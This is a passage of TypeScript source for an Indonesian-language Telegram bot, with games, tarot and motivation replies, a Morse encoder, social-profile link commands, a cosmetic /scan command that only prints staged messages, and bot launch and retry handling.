      ctx.reply(`🎴 <b>TAROT READING</b>\nKartu yang ditarik: <b>${c}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('doa', (ctx) => {
      const d = ['Semoga hari ini rezekimu lancar!', 'Tetap semangat, jangan menyerah!', 'Semoga segala urusanmu dimudahkan.', 'Jaga kesehatan, dunia butuh kamu!', 'Semoga impianmu segera terwujud!'];
      const res = d[Math.floor(Math.random() * d.length)];
      ctx.reply(`🤲 <b>MOTIVASI HARI INI</b>\n<i>"${res}"</i>`, {parse_mode: 'HTML'});
    });

    bot.command('tod', (ctx) => {
      const t = ['Beritahu rahasia terbesarmu!', 'Kapan terakhir kali menangis?', 'Siapa crush kamu saat ini?', 'Pernah ngompol di celana?'];
      const d = ['Kirim foto jelek kamu sekarang!', 'Chat mantan kamu bilang rindu!', 'Ganti PP wa sama gambar monyet seharian!', 'Kirim VN nyanyi balonku!'];
      const isTruth = Math.random() > 0.5;
      const res = isTruth ? `🔵 <b>TRUTH</b>\n${t[Math.floor(Math.random() * t.length)]}` : `🔴 <b>DARE</b>\n${d[Math.floor(Math.random() * d.length)]}`;
      ctx.reply(res, {parse_mode: 'HTML'});
    });

    bot.command('gombal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Sayang';
      const g = [`${nama}, tau bedanya kamu sama modem? Modem connect ke internet, kamu connect ke hatiku.`, `Sejak kenal ${nama}, aku lupa cara sedih.`, `Pisa miring karena terpesona senyum ${nama}.`];
      ctx.reply(`💕 <b>GOMBALAN</b>\n<i>"${g[Math.floor(Math.random() * g.length)]}"</i>`, {parse_mode: 'HTML'});
    });

    bot.command('tebaknegara', (ctx) => {
      const t = [{c:'🇯🇵', a:'Jepang'}, {c:'🇮🇩', a:'Indonesia'}, {c:'🇺🇸', a:'Amerika'}, {c:'🇰🇷', a:'Korea'}, {c:'🇷🇺', a:'Rusia'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🌍 <b>TEBAK BENDERA</b>\nBendera apakah ini: ${items.c} ?\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakkata', (ctx) => {
      const t = [{q:'Selalu di depan, tak terlihat?', a:'Masa Depan'}, {q:'Bisa dipegang tak bisa dilempar?', a:'Janji'}, {q:'Punya gigi tak bisa menggigit?', a:'Sisir'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🤔 <b>TEBAK KATA</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakhewan', (ctx) => {
      const t = [{q:'Hidup di air & darat, melompat.', a:'Katak'}, {q:'Belalai panjang.', a:'Gajah'}, {q:'Leher panjang, makan daun atas.', a:'Jerapah'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🐾 <b>TEBAK HEWAN</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('morse', (ctx) => {
      const text = ctx.message.text.split(' ').slice(1).join(' ').toUpperCase();
      if(!text) return ctx.reply("Format: /morse [text]");
      const morseCode: Record<string, string> = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
        '9': '----.', '0': '-----', ' ': '/'
      };
      const resData = text.split('').map(c => morseCode[c] || c).join(' ');
      const reply = `<b>📡 MORSE ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<pre>${resData}</pre>` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('ig', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /ig [username]");
      ctx.reply(`📸 <b>Instagram Lookup:</b> <a href="https://www.instagram.com/${args[1]}/">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
    });

    bot.command('tiktok', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /tiktok [username]");
      ctx.reply(`🎵 <b>TikTok Lookup:</b> <a href="https://www.tiktok.com/@${args[1]}">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
    });

    bot.command('github', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /github [username]");
      ctx.reply(`🐙 <b>GitHub Lookup:</b> <a href="https://github.com/${args[1]}">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
    });

    bot.command('fb', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /fb [username]");
      ctx.reply(`👥 <b>Facebook Lookup:</b> <a href="https://www.facebook.com/${args[1]}">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
    });

    bot.command('scan', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /scan [IP/Domain]");
      const target = args[1];
      ctx.reply(`🔍 <b>DEEP_SCAN_INITIATED:</b> <code>${target}</code>\n<i>Running multiple recon modules...</i>`, { parse_mode: 'HTML' });
      // Combine IP, Whois, and DNS (fake sequence for aesthetic, but performs work)
      setTimeout(() => ctx.reply(`📡 <i>DNS Module check completed. Use /dns ${target} for details.</i>`, { parse_mode: 'HTML' }), 2000);
      setTimeout(() => ctx.reply(`🌐 <i>IP/Whois analytics processed. Use /whois ${target} for full report.</i>`, { parse_mode: 'HTML' }), 4000);
    });

    let retryCount = 0;
    const launchBot = async () => {
      try {
        await bot.launch({ dropPendingUpdates: true });
        console.log("Telegram bot is running");
      } catch (e: any) {
        if (e && (e.code === 409 || e.response?.error_code === 409)) {
          if (retryCount < 3) {
            retryCount++;
            console.warn(`Telegram Error 409: Conflict detected. (Mungkin bot sedang berjalan di tempat lain). Retrying in 5 seconds... (Attempt ${retryCount}/3)`);
            setTimeout(launchBot, 5000);
          } else {
            console.error("🚨 GAGAL MENJALANKAN BOT: Token bot Telegram ini sedang aktif dan di-host di tempat lain (Misalnya di Deploy Cloud Run atau komputer lokal Anda yang lain). Silakan matikan instance yang lama, atau buat bot baru di BotFather agar token tidak bentrok.");
          }
        } else {
          console.error("Failed to run Telegram Bot:", e);
        }
      }
    };
    launchBot();

    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));
  } else {
    console.log("TELEGRAM_BOT_TOKEN not provided, skipping Telegram bot setup.");
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
